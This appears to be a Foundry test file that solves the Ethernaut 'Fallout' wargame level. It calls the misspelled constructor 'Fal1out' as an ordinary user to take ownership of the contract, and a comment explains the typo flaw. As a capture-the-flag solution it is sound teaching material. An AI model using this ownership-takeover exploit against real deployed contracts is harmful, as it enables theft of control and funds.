// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallout.sol";

/// @custom:win-condition 
/// 1) you claim ownership of the contract

/// @custom:lesson-learned
/// constructor name had a typo meaning it was just a regular function anyone could call

contract FalloutSolvedTest is Test {

  Fallout public s_fallout;
  address payable s_user;
  uint256 s_receiveAmount;

  function setUp() public {
    s_fallout = new Fallout();
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
    s_receiveAmount = 0.0000001 ether;
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    s_fallout.Fal1out{value: s_receiveAmount}();

    // assert win condition 1, become the owner
    assertEq(s_fallout.owner(), s_user);
  }
 
}